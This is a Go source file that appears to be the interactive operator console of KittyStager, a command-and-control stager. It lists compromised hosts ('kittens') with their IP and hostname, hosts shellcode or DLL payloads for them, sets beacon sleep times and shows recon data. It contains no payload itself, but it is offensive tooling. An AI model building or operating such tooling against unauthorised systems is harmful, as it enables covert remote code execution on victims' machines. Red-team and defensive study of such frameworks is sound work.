package interact

import (
	"KittyStager/cmd/httpUtil"
	"KittyStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"os"
	"strconv"
	"strings"
)

func Interact(kittenName string) error {
	in := fmt.Sprintf("KittyStager - %s❯ ", kittenName)
	for {
		t := prompt.Input(in, completer,
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray))
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			os.Exit(1337)
		case "back":
			return nil
		case "target":
			PrintTarget()
		case "payload":
			if kittenName == "all targets" {
				fmt.Println(color.Red("You can't host shellcode on all targets"))
				break
			}
			fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the payload"))
			var path string
			path, err := i.Read("Path: ")
			if err != nil {
				util.ErrPrint(err)
				break
			}
			if strings.HasSuffix(path, ".dll") {
				fmt.Printf("%s\n", color.Yellow("[*] Please enter the entry point"))
				var function string
				function, err = i.Read("Function: ")
				if err != nil {
					util.ErrPrint(err)
					break
				}
				err = httpUtil.HostDll(path, function, kittenName)
			} else {
				err = httpUtil.HostShellcode(path, kittenName)
			}
			if err != nil {
				util.ErrPrint(err)
				break
			}
		case "sleep":
			if len(input) != 2 {
				util.ErrPrint(fmt.Errorf("invalid input"))
				break
			}
			time, err := strconv.Atoi(input[1])
			if err != nil {
				util.ErrPrint(err)
				break
			}
			httpUtil.HostSleep(time, kittenName)
		case "recon":
			initChecks := httpUtil.Targets[kittenName].GetInitChecks()
			util.PrintRecon(initChecks)
		}
	}
	return nil
}

func PrintTarget() {
	fmt.Printf("\n%s\n", color.Green("[*] Targets:"))
	fmt.Printf("%s\n", color.Green("Id:\tKitten name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:\tAlive:"))
	fmt.Printf("%s\n", color.Green("═══\t════════════\t═══\t\t═════════\t\t══════════\t══════\t══════"))

	for name, x := range httpUtil.Targets {
		var e string
		if x.GetAlive() {
			e = "Yes"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Yellow(name),
				color.Yellow(x.InitChecks.GetIp()),
				color.Yellow(x.InitChecks.GetHostname()),
				color.Yellow(x.GetLastSeen().Format("15:04:05")),
				color.Yellow(x.GetSleep()),
				color.Yellow(e))

		} else {
			e = "No"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Red(name),
				color.Red(x.InitChecks.GetIp()),
				color.Red(x.InitChecks.GetHostname()),
				color.Red(x.GetLastSeen().Format("15:04:05")),
				color.Red(x.GetSleep()),
				color.Red(e))

		}
	}
	fmt.Println()
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "back", Description: "Go back to the main menu"},
		{Text: "target", Description: "Show targets"},
		{Text: "payload", Description: "Host a payload"},
		{Text: "sleep", Description: "Set sleep time"},
		{Text: "recon", Description: "Show recon information"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
